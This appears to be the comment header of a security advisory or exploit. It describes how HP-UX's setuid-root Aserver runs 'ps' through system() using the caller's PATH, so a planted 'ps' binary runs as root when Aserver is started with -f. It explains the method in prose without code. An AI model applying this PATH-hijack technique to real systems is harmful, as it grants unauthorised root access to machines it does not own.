# Aserver is a server program that ships with HP-UX versions 10.x and above that is used to interface client applications with the audio hardware. Because it talks to hardware, it is installed setuid root by default.
#
# During normal execution, Aserver executes "ps" via the system() libcall, relying on the PATH environment variable to do so. As a result, a user can modify their PATH environment variable so that it includes an arbitrary program called 'ps' before executing Aserver. When Aserver is run with the -f argument, the offending system() function will be called and the attacker's version of ps will be executed as root.
#
# This is a trivial root compromise.
